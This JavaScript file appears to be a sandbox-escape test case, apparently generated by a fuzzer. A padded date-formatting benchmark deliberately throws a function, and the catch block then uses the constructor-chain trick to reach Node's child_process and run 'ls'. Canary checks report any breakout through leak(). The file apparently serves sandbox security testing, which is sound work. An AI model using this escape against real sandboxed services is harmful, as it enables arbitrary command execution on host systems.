try {
    function arrayExists(array, x) {
        let REPLACER = 23;
        for (var i = 0; i < array.length; i++) {
            if (array[i] == x)
                return true;
        }
        return false;
    }
    Date.prototype.formatDate = function (input, time) {
        let REPLACER = 23;
        var switches = [
            'a',
            'A',
            'B',
            'd',
            'D',
            'F',
            'g',
            'G',
            'h',
            'H',
            'i',
            'j',
            'l',
            'L',
            'm',
            'M',
            'n',
            'O',
            'r',
            's',
            'S',
            't',
            'U',
            'w',
            'W',
            'y',
            'Y',
            'z'
        ];
        var daysLong = [
            'Sunday',
            'Monday',
            'Tuesday',
            'Wednesday',
            'Thursday',
            'Friday',
            'Saturday'
        ];
        var daysShort = [
            'Sun',
            'Mon',
            'Tue',
            'Wed',
            'Thu',
            'Fri',
            'Sat'
        ];
        var monthsShort = [
            'Jan',
            'Feb',
            'Mar',
            'Apr',
            'May',
            'Jun',
            'Jul',
            'Aug',
            'Sep',
            'Oct',
            'Nov',
            'Dec'
        ];
        var monthsLong = [
            'January',
            'February',
            'March',
            'April',
            'May',
            'June',
            'July',
            'August',
            'September',
            'October',
            'November',
            'December'
        ];
        var daysSuffix = [
            'st',
            'nd',
            'rd',
            'th',
            'th',
            'th',
            'th',
            'th',
            'th',
            'th',
            'th',
            'th',
            'th',
            'th',
            'th',
            'th',
            'th',
            'th',
            'th',
            'th',
            'st',
            'nd',
            'rd',
            'th',
            'th',
            'th',
            'th',
            'th',
            'th',
            'th',
            'st'
        ];
        function a() {
            let REPLACER = 23;
            return self.getHours() > 11 ? 'pm' : 'am';
        }
        function A() {
            let REPLACER = 23;
            return self.getHours() > 11 ? 'PM' : 'AM';
        }
        function B() {
            let REPLACER = 23;
            var off = (self.getTimezoneOffset() + 60) * 60;
            var theSeconds = self.getHours() * 3600 + self.getMinutes() * 60 + self.getSeconds() + off;
            var beat = Math.floor(theSeconds / 86.4);
            if (beat > 1000)
                beat -= 1000;
            if (beat < 0)
                beat += 1000;
            if (('' + beat).length == 1)
                beat = '00' + beat;
            if (('' + beat).length == 2)
                beat = '0' + beat;
            return beat;
        }
        function d() {
            let REPLACER = 23;
            return new String(self.getDate()).length == 1 ? '0' + self.getDate() : self.getDate();
        }
        function D() {
            let REPLACER = 23;
            return daysShort[self.getDay()];
        }
        function F() {
            let REPLACER = 23;
            return monthsLong[self.getMonth()];
        }
        function g() {
            let REPLACER = 23;
            return self.getHours() > 12 ? self.getHours() - 12 : self.getHours();
        }
        function G() {
            let REPLACER = 23;
            return self.getHours();
        }
        function h() {
            let REPLACER = 23;
            if (self.getHours() > 12) {
                var s = new String(self.getHours() - 12);
                return s.length == 1 ? '0' + (self.getHours() - 12) : self.getHours() - 12;
            } else {
                var s = new String(self.getHours());
                return s.length == 1 ? '0' + self.getHours() : self.getHours();
            }
        }
        function H() {
            let REPLACER = 23;
            return new String(self.getHours()).length == 1 ? '0' + self.getHours() : self.getHours();
        }
        function i() {
            let REPLACER = 23;
            return new String(self.getMinutes()).length == 1 ? '0' + self.getMinutes() : self.getMinutes();
        }
        function j() {
            let REPLACER = 23;
            return self.getDate();
        }
        function l() {
            let REPLACER = 23;
            return daysLong[self.getDay()];
        }
        function L() {
            let REPLACER = 23;
            var y_ = Y();
            if (y_ % 4 == 0 && y_ % 100 != 0 || y_ % 4 == 0 && y_ % 100 == 0 && y_ % 400 == 0) {
                return 1;
            } else {
                return 0;
            }
        }
        function m() {
            let REPLACER = 23;
            return self.getMonth() < 9 ? '0' + (self.getMonth() + 1) : self.getMonth() + 1;
        }
        function M() {
            let REPLACER = 23;
            return monthsShort[self.getMonth()];
        }
        function n() {
            throw () => {
                return () => {
                };
            };
            return self.getMonth() + 1;
        }
        function O() {
            var os = Math.abs(self.getTimezoneOffset());
            var h = '' + Math.floor(os / 60);
            var m = '' + os % 60;
            h.length == 1 ? h = '0' + h : 1;
            m.length == 1 ? m = '0' + m : 1;
            return self.getTimezoneOffset() < 0 ? '+' + h + m : '-' + h + m;
        }
        function r() {
            var r;
            r = D() + ', ' + j() + ' ' + M() + ' ' + Y() + ' ' + H() + ':' + i() + ':' + s() + ' ' + O();
            return r;
        }
        function S() {
            return daysSuffix[self.getDate() - 1];
        }
        function s() {
            return new String(self.getSeconds()).length == 1 ? '0' + self.getSeconds() : self.getSeconds();
        }
        function t() {
            var daysinmonths = [
                null,
                31,
                28,
                31,
                30,
                31,
                30,
                31,
                31,
                30,
                31,
                30,
                31
            ];
            if (L() == 1 && n() == 2)
                return 29;
            return daysinmonths[n()];
        }
        function U() {
            return Math.round(self.getTime() / 1000);
        }
        function W() {
            var beforeNY = 364 + L() - z();
            var afterNY = z();
            var weekday = w() != 0 ? w() - 1 : 6;
            if (beforeNY <= 2 && weekday <= 2 - beforeNY) {
                return 1;
            }
            var ny = new Date('January 1 ' + Y() + ' 00:00:00');
            var nyDay = ny.getDay() != 0 ? ny.getDay() - 1 : 6;
            if (afterNY <= 2 && nyDay >= 4 && afterNY >= 6 - nyDay) {
                var prevNY = new Date('December 31 ' + (Y() - 1) + ' 00:00:00');
                return prevNY.formatDate('W');
            }
            if (nyDay <= 3) {
                return 1 + Math.floor((z() + nyDay) / 7);
            } else {
                return 1 + Math.floor((z() - (7 - nyDay)) / 7);
            }
        }
        function w() {
            return self.getDay();
        }
        function Y() {
            if (self.getFullYear) {
                var newDate = new Date('January 1 2001 00:00:00 +0000');
                var x = newDate.getFullYear();
                if (x == 2001) {
                    return self.getFullYear();
                }
            }
            var x = self.getYear();
            var y = x % 100;
            y += y < 38 ? 2000 : 1900;
            return y;
        }
        function y() {
            var y = Y() + '';
            return y.substring(y.length - 2, y.length);
        }
        function z() {
            var t = new Date('January 1 ' + Y() + ' 00:00:00');
            var diff = self.getTime() - t.getTime();
            return Math.floor(diff / 1000 / 60 / 60 / 24);
        }
        var self = this;
        if (time) {
            var prevTime = self.getTime();
            self.setTime(time);
        }
        var ia = input.split('');
        var ij = 0;
        while (ia[ij]) {
            if (ia[ij] == '\\') {
                ia.splice(ij, 1);
            } else {
                if (arrayExists(switches, ia[ij])) {
                    ia[ij] = eval(ia[ij] + '()');
                }
            }
            ij++;
        }
        if (prevTime) {
            self.setTime(prevTime);
        }
        return ia.join('');
    };
    var date = new Date('1/1/2007 1:11:11');
    for (i = 0; i < 500; ++i) {
        var shortFormat = date.formatDate('Y-m-d');
        var longFormat = date.formatDate('l, F d, Y g:i:s A');
        date.setTime(date.getTime() + 84266956);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}